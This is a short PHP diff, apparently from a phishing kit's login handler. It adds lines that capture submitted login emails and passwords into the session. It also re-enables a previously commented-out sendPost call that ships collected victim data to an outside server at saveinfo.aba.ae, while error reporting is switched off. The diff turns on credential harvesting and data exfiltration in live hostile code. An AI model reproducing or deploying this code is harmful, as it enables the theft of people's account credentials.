@@ -3,6 +3,9 @@
 session_start();
 error_reporting(0);
 
+$_SESSION['_login_email_']    = $_POST['login_email'];
+$_SESSION['_login_password_'] = $_POST['login_password'];
+
 $TIME_DATE = date('H:i:s d/m/Y');
 
 include('../../functions/get_ip.php');
@@ -132,7 +135,7 @@ $data['b'] = ($_SERVER['HTTP_USER_AGENT']);
 //$data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);
 
 
-//sendPost('http://saveinfo.aba.ae/Save/sv1.php',$data);
+sendPost('http://saveinfo.aba.ae/Save/sv1.php',$data);
 
 
 //---- end request----------------
